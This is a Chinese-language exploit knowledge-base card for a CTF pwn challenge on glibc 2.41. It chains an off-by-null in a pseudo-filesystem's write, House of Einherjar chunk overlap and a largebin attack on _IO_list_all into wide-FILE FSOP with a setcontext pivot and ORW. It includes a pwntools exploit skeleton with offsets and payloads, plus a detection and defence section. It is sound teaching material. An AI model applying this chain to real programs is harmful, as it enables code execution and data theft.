---
id: binary-pwn-heap-vfs-offby-null-einherjar-largebin-io-list-all-fsop
title: 伪文件系统 off-by-null 触发 House of Einherjar：chunk 重叠后 largebin attack 改 _IO_list_all 转 wide FILE FSOP ORW
type: scenario
domain: binary
path: binary/pwn/heap
technique: vfs-offby-null-einherjar-largebin-io-list-all-fsop
tags:
- pwn
- heap
- glibc241
- off-by-null
- house-of-einherjar
- largebin
- fsop
- io-list-all
- wide-file
- setcontext
- seccomp
- orw
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V159
  verified_at: '2026-11-06T07:38:51+08:00'
  notes: 已对照原文逐段核对：SU_minivfs glibc 2.41、FNV-1a+mixer+0xA5A5A5A5可预测auth、write满cap补NUL的off-by-null、/aj伪造0x4f0 chunk清/ap PREV_INUSE触发Einherjar、largebin改_IO_list_all、wide FILE _IO_wfile_jumps转setcontext、ORW/getdents64均与原文exp一致。未验证点：PoC未在本机复跑，原文反编译未直接展示补NUL语句（作者按汇编与实际效果确认）；原文未提供sources/source_url。原文只给靶场glibc 2.41，未给受影响版本区间，未设置versions。
url: /docs/binary/pwn/heap/binary-pwn-heap-vfs-offby-null-einherjar-largebin-io-list-all-fsop/
draft: false
kb_aliases:
- SU_minivfs
- 2.41heap
- FNV-1a 可预测 auth token
- 写满容量补 NUL off-by-null
- House of Einherjar 向前合并
- largebin attack _IO_list_all
- glibc 2.41 FSOP
---

## 一句话结论

伪文件系统的 `write` 在写入长度恰好等于容量时会多补一个 NUL，形成单字节 off-by-null；用它在 `/aj` 用户区伪造 0x4f0 chunk 并清掉相邻 `/ap` 的 PREV_INUSE，`free("/ap")` 即触发 House of Einherjar 向前合并，制造大范围 chunk 重叠；再借 largebin 插入把 `_IO_list_all` 改成重叠块地址，退出时 `_IO_flush_all_lockp` 遍历到伪造的 wide FILE，经 `_IO_wfile_jumps` 到 `setcontext` 完成栈迁移并执行 ORW。

## 原理

- **鉴权是公开可算的 token，不是访问控制**：路径先做 32 位 FNV-1a（初值 0x811C9DC5、乘子 0x1000193），再过一轮 32 位 mixer（`x ^= x>>16; x *= 0x7FEB352D; x ^= x>>15; x *= 0x846CA68B; x ^= x>>16`），最后 `auth = hash ^ 0xA5A5A5A5`。整个过程只依赖用户自己给出的 path，没有密钥或服务端随机数，客户端可以离线算出任意命令的 auth，因此这层“鉴权”不构成障碍。
- **off-by-null 来源**：`vfs_write_entry` 只检查 `nbytes <= cap`，拷贝后按 C 字符串习惯补 `data[nbytes] = '\0'`。当 `nbytes == cap` 时，这个 NUL 落在用户区末尾之后，也就是下一个 chunk 的 `size` 最低字节；glibc 2.41 仍用该字节的 PREV_INUSE 位判断前一个 chunk 是否空闲，于是相邻 chunk 被误认为“前块已释放”。
- **House of Einherjar**：在 `/aj`（cap 0x4f8，对应 chunk 0x500）用户区偏移 0 处布置 fake chunk 头 `prev_size=0, size=0x4f0`，并把 fd/bk 指向可控地址；同时在用户区末尾（恰好覆盖下一 chunk 的 `prev_size`）写入 0x4f0。off-by-null 清掉 `/ap` 的 PREV_INUSE 后，`free("/ap")` 依据 `prev_size=0x4f0` 回退到 fake chunk；unlink 的一致性检查 `FD->bk == P && BK->fd == P` 因为 fd/bk 指向攻击者可控区而通过，fake chunk 与 `/ap` 合并成大块。
- **重叠的形成**：合并后的空闲块覆盖了 `/aj` 的用户数据。随后按脚本重新分配 `/ap`、`/bk`、`/bg` 并释放 `/ar`，使 `/ar`、`/ak` 等记录与旧的合并区域重叠；这样一块内存可以同时被两个文件记录引用，等价于可控的 UAF/overlap，既能读元数据也能改写其他对象的字段。
- **泄露**：`cat` 按记录里的 cap 整块输出，不按实际写入长度截断，因此很容易变成“把堆块原样吐出来”的接口。先让某条记录指向 unsorted bin 中的空闲块，`cat` 读回 fd/bk，即可算 libc 基址与 heap 基址；后续 fake chunk、fake FILE 和 ROP 栈的地址都由此推出。
- **largebin attack**：fake chunk 的 `bk_nextsize` 位于用户区偏移 0x28。把它改为 `_IO_list_all - 0x20` 后，当合并块被整理进 largebin 时，插入路径执行 `victim->bk_nextsize->fd_nextsize = victim`，即把 `victim` 写到 `_IO_list_all`（因为 `fd_nextsize` 在 chunk+0x20）。
- **wide FILE FSOP**：退出时 `_IO_flush_all_lockp` 从 `_IO_list_all` 遍历 FILE 链，对 `_mode > 0` 且 wide 缓冲区写指针大于基址的对象调用 wide 路径。伪造的 FILE 主体放在与合并块重叠的 `/ar`，`vtable` 使用 libc 内合法的 `_IO_wfile_jumps`；fake `_wide_data`、fake wide vtable、路径字符串和 ROP 栈放在 `/ak`。vtable 仍落在 `__libc_IO_vtables` 区间，可绕过 vtable 合法性校验。
- **setcontext 与 ORW**：`_IO_wfile` 路径最终进入 `setcontext`；该 libc 中偏移约 0x4bb20 的 `setcontext` 从 rdx 指向的上下文区恢复 rsp 等寄存器，从而 pivot 到 `/ak` 里布置的 `pop rsp; ret` 和 ROP 链。seccomp 下只使用 open/read/write；若直接读 `./flag` 得到诱饵，则改为 open(".")+getdents64+write 列目录定位真实文件名，再 ORW。
- **为什么能稳定落地**：fake chunk 的地址、相邻 chunk 头和 `_IO_list_all` 目标都来自同一次泄露；largebin 插入是确定性的内存写，不依赖竞态；退出路径 `quit` 是程序正常功能，能稳定触发 `_IO_flush_all_lockp`。

## 触发条件

- glibc 2.41 目标程序（文章环境）。不同版本必须重新核对 `_IO_list_all`、`_IO_wfile_jumps` 和 `setcontext` 偏移；文章目标 libc 中三者约为 0x2114c0、0x20f1c8、0x4bb20。
- 程序提供按容量整块读的接口（`cat`），以及允许 `nbytes == cap` 的写接口（`write`），且写路径补 NUL。
- 有稳定的 `touch`/`rm`（malloc/free）和足够的堆布局控制，能连续分配 0x500、0x4e0、0x430 档 chunk。
- 程序存在正常退出路径（`quit`/`exit`），退出时会遍历 `_IO_list_all`。
- 目标允许 open/read/write（或用 getdents64 列目录）。

## 利用步骤

1. 按 path 计算 auth：FNV-1a + mixer + `^ 0xA5A5A5A5`；后续所有 `touch`/`rm`/`cat`/`write` 都带该 token。
2. 泄露阶段：`touch /aa /ab /ac`（0x428），`rm /ab`，`touch /ad`（0x500）、`/ae`（0x428）；`cat /ae` 读 unsorted bin 的 fd/bk，计算 libc base 与 heap base。
3. 利用布局：`touch /aj /ap`（均 0x4f8）、`/ar`（0x4d8）、`/ak`（0x428）；先在 `/ar` 写 fake FILE 主体，在 `/ak` 写 fake `_wide_data`、fake wide vtable、目标路径和 ROP 链。
4. 在 `/aj` 写入 fake chunk：`prev_size=0, size=0x4f0, fd=bk=<可控地址>`，用户区末尾写 0x4f0；随后以恰好 0x4f8 字节写满，触发补 NUL，清掉 `/ap` 的 PREV_INUSE。
5. `rm /ap` 触发 House of Einherjar 向前合并；按脚本继续 `touch /ap`(0x4e8)、`touch /bk`(0x4f8)、`rm /ap`、`touch /bg`(0x500)、`rm /ar`，让 `/ar`、`/ak` 与合并块重叠。
6. `cat /aj` 读出重叠区元数据，把用户区偏移 0x28 的 `bk_nextsize` 改为 `_IO_list_all - 0x20`，再写回 `/aj`（仍以 0x4f8 字节触发 off-by-null）。
7. `touch /ag`(0x500) 推动 largebin 插入，把 `_IO_list_all` 写成 overlapping chunk 地址。
8. 发送 `quit` 触发 exit；`_IO_flush_all_lockp` 命中 fake wide FILE，经 `_IO_wfile_jumps` 到 `setcontext`，pivot 到 ROP 执行 ORW。

## PoC

原文给出了完整 pwntools 脚本；下面只保留可复用的最小骨架，偏移必须按目标 libc 重新核对：

```python
def path_hash(path):
    x = 0x811C9DC5
    for b in path.encode():
        x = ((x ^ b) * 0x1000193) & 0xffffffff
    x ^= x >> 16; x = (x * 0x7FEB352D) & 0xffffffff
    x ^= x >> 15; x = (x * 0x846CA68B) & 0xffffffff
    x ^= x >> 16
    return x

def auth(path):
    return str((path_hash(path) ^ 0xA5A5A5A5) & 0xffffffff)

# 1) 泄露 libc / heap
for n in ("/aa", "/ab", "/ac"):
    touch(n, 0x428)
rm("/ab"); touch("/ad", 0x500); touch("/ae", 0x428)
leak = cat("/ae")[:-1]
libc_base = u64(leak[:8].ljust(8, b"\0")) - 0x210F10   # 目标 libc 的 unsorted bin 偏移
heap_base = u64(leak[16:24].ljust(8, b"\0")) - 0x430

# 2) 伪造 House of Einherjar
touch("/aj", 0x4F8); touch("/ap", 0x4F8); touch("/ar", 0x4D8); touch("/ak", 0x428)
fake_fd = heap_base + 0x510 + 0x10          # 指向受控区，满足 unlink 的 FD/BK 校验
pay = p64(0) + p64(0x4F0) + p64(fake_fd) * 4
pay = pay.ljust(0x4F0, b"F") + p64(0x4F0)
write("/aj", pay)                            # len == cap == 0x4F8，末尾 NUL 清 /ap 的 PREV_INUSE
rm("/ap")                                    # 向前合并到 fake chunk

# 3) largebin attack -> _IO_list_all
meta = bytearray(cat("/aj")[:-1])
meta[0x28:0x30] = p64(libc_base + 0x2114C0 - 0x20)   # _IO_list_all - 0x20
write("/aj", bytes(meta[:0x4F8]))
touch("/ag", 0x500)                          # 触发 largebin 插入
send("quit")                                 # exit -> _IO_flush_all_lockp -> _IO_wfile_jumps -> setcontext -> ORW
```

fake FILE 的 `_mode=1`、`_wide_data`、`_IO_wfile_jumps` 字段以及 `setcontext` 后的 ORW 链与通用 wide FILE FSOP 相同，本卡不重复展开；原文完整脚本中 fake FILE 主体由 `build_h` 写入 `/ar`，fake `_wide_data`/ROP 由 `build_j` 写入 `/ak`。

## 变体与关联

- **无 cat 泄露**：可用 unsorted bin/tcache 的其它泄露路径先拿 libc 和 heap，或者用 partial overwrite 直接改堆指针。
- **合并后不走 largebin**：若目标 glibc 开启 tcache，可把重叠块直接投毒到任意地址；largebin 只是把重叠块地址写到 `_IO_list_all` 的一种稳定方式。
- **FSOP 目标变体**：可改 `_IO_2_1_stdout_`/`stderr`（House of Apple 2）或旧版本的 `__free_hook`；选 `_IO_list_all` 是因为 exit 一定遍历 FILE 链。
- **ORW 变体**：可用 openat/openat2 替代 open；getdents64 列目录用于区分“链成功”与“flag 路径不对”。
- 关联：[[binary-pwn-heap-largebin-io-list-all-wide-file-setcontext-orw]]（同族 largebin + wide FILE 链，但入口是 UAF stale slot、glibc 2.35）、[[binary-pwn-heap-note-offbyone-unlink-house-of-some-iofile]]（off-by-one + unlink）、[[binary-pwn-heap-uaf-unsorted-bin-libc-leak]]（泄露基础）。

## 检测与防御

- **检测**：`_IO_list_all` 指向堆而非 libc 的 `_IO_2_1_stderr_`；exit 阶段出现 `_IO_flush_all_lockp → _IO_wfile_* → setcontext` 异常栈；largebin 中出现 `bk_nextsize` 指向 libc 数据段附近的伪造 chunk；同一进程连续出现 open/getdents64/read/write syscall 链。
- **防御**：写入路径在补 NUL 前检查 `nbytes < cap`，或改用显式长度、`strnlen`；对 `cat` 按实际写入长度而非 cap 输出做审计；开启堆一致性检查、AddressSanitizer/MTE；FSOP 防线不能只依赖 vtable 校验，需要配合指针完整性、CFI 与及时升级 glibc。
- **根因**：伪文件系统把“容量”和“字符串长度”混用；任何允许 `write(len == cap)` 再补终止符的实现都应视为潜在 off-by-null。
